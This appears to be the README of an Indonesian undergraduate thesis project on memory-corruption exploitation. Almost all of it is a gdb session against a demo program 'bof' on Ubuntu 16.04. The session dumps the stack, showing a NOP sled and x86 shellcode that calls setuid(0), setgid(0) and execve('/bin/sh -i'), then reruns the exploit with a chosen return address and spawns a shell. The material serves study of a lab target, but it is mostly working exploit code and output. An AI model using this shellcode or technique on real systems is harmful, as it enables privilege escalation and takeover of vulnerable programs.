# Proyek Tugas Akhir
Dengan judul <b>Model Eksploitasi Memory Corruption Vulnerabilities di Modern System</b>

Klasik binary exploitation di Ubuntu 16.04

---

<h4>Stack Buffer Overflow</h4>
<code>
  % gdb -q bof
Reading symbols from bof...(no debugging symbols found)...done.
(gdb) r `./exploit 0xffffffff`
Starting program: /home/febri/projek/tugas-akhir/kode-program/compiled-binary/demo/bof `./exploit 0xffffffff`
eip di fungsi main() pada stack frame ada pada alamat 0xbfffec20
kamu mengatakan : �����������������������������������1ۉذ̀1ۉذ.̀1�Rhn/shh//bi��Rfh-i��RQS��j
                                                                                         X̀jX1�̀����������������������������

Program received signal SIGSEGV, Segmentation fault.
0xffffffff in ?? ()
(gdb) i r $esp
esp            0xbfffec80	0xbfffec80
(gdb) x/1000bx 0xbfffec00
0xbfffec00:	0x70	0xa5	0xe7	0xb7	0x1e	0xec	0xff	0xbf
0xbfffec08:	0x00	0xe0	0xfa	0xb7	0x75	0x56	0xe4	0xb7
0xbfffec10:	0x7e	0x84	0x04	0x08	0x4a	0x85	0x04	0x08
0xbfffec18:	0x1e	0xec	0xff	0xbf	0x17	0x2f	0x90	0x90
0xbfffec20:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbfffec28:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbfffec30:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbfffec38:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbfffec40:	0x90	0x31	0xdb	0x89	0xd8	0xb0	0x17	0xcd
0xbfffec48:	0x80	0x31	0xdb	0x89	0xd8	0xb0	0x2e	0xcd
0xbfffec50:	0x80	0x31	0xd2	0x52	0x68	0x6e	0x2f	0x73
0xbfffec58:	0x68	0x68	0x2f	0x2f	0x62	0x69	0x89	0xe3
0xbfffec60:	0x52	0x66	0x68	0x2d	0x69	0x89	0xe1	0x52
0xbfffec68:	0x51	0x53	0x89	0xe1	0x6a	0x0b	0x58	0xcd
0xbfffec70:	0x80	0x6a	0x01	0x58	0x31	0xdb	0xcd	0x80
0xbfffec78:	0xff	0xff	0xff	0xff	0xff	0xff	0xff	0xff
0xbfffec80:	0xff	0xff	0xff	0xff	0xff	0xff	0xff	0xff
0xbfffec88:	0xff	0xff	0xff	0xff	0xff	0xff	0xff	0xff
0xbfffec90:	0xff	0xff	0xff	0xff	0x00	0x00	0x00	0x00
0xbfffec98:	0x00	0xe0	0xfa	0xb7	0x04	0xfc	0xff	0xb7
0xbfffeca0:	0x00	0xf0	0xff	0xb7	0x00	0x00	0x00	0x00
0xbfffeca8:	0x00	0xe0	0xfa	0xb7	0x00	0xe0	0xfa	0xb7
0xbfffecb0:	0x00	0x00	0x00	0x00	0xb7	0xfa	0x0e	0xe5
0xbfffecb8:	0xa7	0x14	0x5c	0xd8	0x00	0x00	0x00	0x00
0xbfffecc0:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0xbfffecc8:	0x02	0x00	0x00	0x00	0x40	0x83	0x04	0x08
0xbfffecd0:	0x00	0x00	0x00	0x00	0x10	0x00	0xff	0xb7
0xbfffecd8:	0x80	0xa8	0xfe	0xb7	0x00	0xf0	0xff	0xb7
0xbfffece0:	0x02	0x00	0x00	0x00	0x40	0x83	0x04	0x08
0xbfffece8:	0x00	0x00	0x00	0x00	0x61	0x83	0x04	0x08
0xbfffecf0:	0x3b	0x84	0x04	0x08	0x02	0x00	0x00	0x00
0xbfffecf8:	0x14	0xed	0xff	0xbf	0x90	0x84	0x04	0x08
0xbfffed00:	0xf0	0x84	0x04	0x08	0x80	0xa8	0xfe	0xb7
0xbfffed08:	0x0c	0xed	0xff	0xbf	0x18	0xf9	0xff	0xb7
0xbfffed10:	0x02	0x00	0x00	0x00	0x30	0xef	0xff	0xbf
0xbfffed18:	0x75	0xef	0xff	0xbf	0x00	0x00	0x00	0x00
0xbfffed20:	0xec	0xef	0xff	0xbf	0xfb	0xef	0xff	0xbf
0xbfffed28:	0x0d	0xf0	0xff	0xbf	0x2b	0xf0	0xff	0xbf
0xbfffed30:	0x4e	0xf0	0xff	0xbf	0x59	0xf0	0xff	0xbf
0xbfffed38:	0x7b	0xf0	0xff	0xbf	0x8d	0xf0	0xff	0xbf
0xbfffed40:	0xa4	0xf0	0xff	0xbf	0xd0	0xf0	0xff	0xbf
0xbfffed48:	0x03	0xf1	0xff	0xbf	0x24	0xf1	0xff	0xbf
0xbfffed50:	0x32	0xf1	0xff	0xbf	0x41	0xf1	0xff	0xbf
0xbfffed58:	0x55	0xf1	0xff	0xbf	0x68	0xf1	0xff	0xbf
---Type <return> to continue, or q <return> to quit---
0xbfffed60:	0x29	0xf2	0xff	0xbf	0x40	0xf2	0xff	0xbf
0xbfffed68:	0x55	0xf2	0xff	0xbf	0x67	0xf2	0xff	0xbf
0xbfffed70:	0x79	0xf2	0xff	0xbf	0x8f	0xf2	0xff	0xbf
0xbfffed78:	0xa3	0xf2	0xff	0xbf	0xdd	0xf2	0xff	0xbf
0xbfffed80:	0x06	0xf3	0xff	0xbf	0x29	0xf3	0xff	0xbf
0xbfffed88:	0x44	0xf3	0xff	0xbf	0x56	0xf3	0xff	0xbf
0xbfffed90:	0x76	0xf3	0xff	0xbf	0x91	0xf3	0xff	0xbf
0xbfffed98:	0xa3	0xf3	0xff	0xbf	0xba	0xf3	0xff	0xbf
0xbfffeda0:	0xfe	0xf3	0xff	0xbf	0x34	0xf4	0xff	0xbf
0xbfffeda8:	0x78	0xf4	0xff	0xbf	0x9b	0xf4	0xff	0xbf
0xbfffedb0:	0xb2	0xf4	0xff	0xbf	0xd1	0xf4	0xff	0xbf
0xbfffedb8:	0xe4	0xf4	0xff	0xbf	0xef	0xf4	0xff	0xbf
0xbfffedc0:	0x1c	0xf5	0xff	0xbf	0x61	0xf5	0xff	0xbf
0xbfffedc8:	0x72	0xf5	0xff	0xbf	0x8a	0xf5	0xff	0xbf
0xbfffedd0:	0x9c	0xf5	0xff	0xbf	0xad	0xf5	0xff	0xbf
0xbfffedd8:	0xc0	0xf5	0xff	0xbf	0xf4	0xf5	0xff	0xbf
0xbfffede0:	0x6f	0xf6	0xff	0xbf	0x7e	0xf6	0xff	0xbf
0xbfffede8:	0x9b	0xf6	0xff	0xbf	0xcc	0xf6	0xff	0xbf
0xbfffedf0:	0xdd	0xf6	0xff	0xbf	0xfc	0xf6	0xff	0xbf
0xbfffedf8:	0x10	0xf7	0xff	0xbf	0x42	0xf7	0xff	0xbf
0xbfffee00:	0x4a	0xf7	0xff	0xbf	0x5c	0xf7	0xff	0xbf
0xbfffee08:	0x67	0xf7	0xff	0xbf	0x76	0xf7	0xff	0xbf
0xbfffee10:	0x90	0xf7	0xff	0xbf	0xa4	0xf7	0xff	0xbf
0xbfffee18:	0xbe	0xf7	0xff	0xbf	0xd3	0xf7	0xff	0xbf
0xbfffee20:	0x0f	0xf8	0xff	0xbf	0x22	0xf8	0xff	0xbf
0xbfffee28:	0x3b	0xf8	0xff	0xbf	0x83	0xf8	0xff	0xbf
0xbfffee30:	0x9e	0xf8	0xff	0xbf	0xa9	0xf8	0xff	0xbf
0xbfffee38:	0xb1	0xf8	0xff	0xbf	0xc6	0xf8	0xff	0xbf
0xbfffee40:	0xe6	0xf8	0xff	0xbf	0x6e	0xfe	0xff	0xbf
0xbfffee48:	0x8d	0xfe	0xff	0xbf	0xa6	0xfe	0xff	0xbf
0xbfffee50:	0xd4	0xfe	0xff	0xbf	0xec	0xfe	0xff	0xbf
0xbfffee58:	0x21	0xff	0xff	0xbf	0x5b	0xff	0xff	0xbf
0xbfffee60:	0xa2	0xff	0xff	0xbf	0xab	0xff	0xff	0xbf
0xbfffee68:	0x00	0x00	0x00	0x00	0x20	0x00	0x00	0x00
0xbfffee70:	0xc8	0xab	0xfd	0xb7	0x21	0x00	0x00	0x00
0xbfffee78:	0x00	0xa0	0xfd	0xb7	0x10	0x00	0x00	0x00
0xbfffee80:	0xff	0xfb	0x8b	0x17	0x06	0x00	0x00	0x00
0xbfffee88:	0x00	0x10	0x00	0x00	0x11	0x00	0x00	0x00
0xbfffee90:	0x64	0x00	0x00	0x00	0x03	0x00	0x00	0x00
0xbfffee98:	0x34	0x80	0x04	0x08	0x04	0x00	0x00	0x00
0xbfffeea0:	0x20	0x00	0x00	0x00	0x05	0x00	0x00	0x00
0xbfffeea8:	0x09	0x00	0x00	0x00	0x07	0x00	0x00	0x00
0xbfffeeb0:	0x00	0xb0	0xfd	0xb7	0x08	0x00	0x00	0x00
0xbfffeeb8:	0x00	0x00	0x00	0x00	0x09	0x00	0x00	0x00
---Type <return> to continue, or q <return> to quit---
0xbfffeec0:	0x40	0x83	0x04	0x08	0x0b	0x00	0x00	0x00
0xbfffeec8:	0xe8	0x03	0x00	0x00	0x0c	0x00	0x00	0x00
0xbfffeed0:	0xe8	0x03	0x00	0x00	0x0d	0x00	0x00	0x00
0xbfffeed8:	0xe8	0x03	0x00	0x00	0x0e	0x00	0x00	0x00
0xbfffeee0:	0xe8	0x03	0x00	0x00	0x17	0x00	0x00	0x00
0xbfffeee8:	0x00	0x00	0x00	0x00	0x19	0x00	0x00	0x00
0xbfffeef0:	0x1b	0xef	0xff	0xbf	0x1f	0x00	0x00	0x00
0xbfffeef8:	0xb7	0xff	0xff	0xbf	0x0f	0x00	0x00	0x00
0xbfffef00:	0x2b	0xef	0xff	0xbf	0x00	0x00	0x00	0x00
0xbfffef08:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0xbfffef10:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0xbfffef18:	0x00	0x00	0x00	0x7a	0x5e	0x04	0xd8	0xfd
0xbfffef20:	0x6b	0x0d	0xe4	0xb6	0x78	0x9b	0x87	0x87
0xbfffef28:	0x54	0x05	0x5c	0x69	0x36	0x38	0x36	0x00
0xbfffef30:	0x2f	0x68	0x6f	0x6d	0x65	0x2f	0x66	0x65
0xbfffef38:	0x62	0x72	0x69	0x2f	0x70	0x72	0x6f	0x6a
0xbfffef40:	0x65	0x6b	0x2f	0x74	0x75	0x67	0x61	0x73
0xbfffef48:	0x2d	0x61	0x6b	0x68	0x69	0x72	0x2f	0x6b
0xbfffef50:	0x6f	0x64	0x65	0x2d	0x70	0x72	0x6f	0x67
0xbfffef58:	0x72	0x61	0x6d	0x2f	0x63	0x6f	0x6d	0x70
0xbfffef60:	0x69	0x6c	0x65	0x64	0x2d	0x62	0x69	0x6e
0xbfffef68:	0x61	0x72	0x79	0x2f	0x64	0x65	0x6d	0x6f
0xbfffef70:	0x2f	0x62	0x6f	0x66	0x00	0x90	0x90	0x90
0xbfffef78:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbfffef80:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbfffef88:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbfffef90:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbfffef98:	0x31	0xdb	0x89	0xd8	0xb0	0x17	0xcd	0x80
0xbfffefa0:	0x31	0xdb	0x89	0xd8	0xb0	0x2e	0xcd	0x80
0xbfffefa8:	0x31	0xd2	0x52	0x68	0x6e	0x2f	0x73	0x68
0xbfffefb0:	0x68	0x2f	0x2f	0x62	0x69	0x89	0xe3	0x52
0xbfffefb8:	0x66	0x68	0x2d	0x69	0x89	0xe1	0x52	0x51
0xbfffefc0:	0x53	0x89	0xe1	0x6a	0x0b	0x58	0xcd	0x80
0xbfffefc8:	0x6a	0x01	0x58	0x31	0xdb	0xcd	0x80	0xff
0xbfffefd0:	0xff	0xff	0xff	0xff	0xff	0xff	0xff	0xff
0xbfffefd8:	0xff	0xff	0xff	0xff	0xff	0xff	0xff	0xff
0xbfffefe0:	0xff	0xff	0xff	0xff	0xff	0xff	0xff	0xff
(gdb) r `./exploit 0xbfffef80`
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/febri/projek/tugas-akhir/kode-program/compiled-binary/demo/bof `./exploit 0xbfffef80`
eip di fungsi main() pada stack frame ada pada alamat 0xbfffec20
kamu mengatakan : �����������������������������������1ۉذ̀1ۉذ.̀1�Rhn/shh//bi��Rfh-i��RQS��j
                                                                                         X̀jX1�̀����������������������������
process 12451 is executing new program: /bin/dash
$ 
  </code>
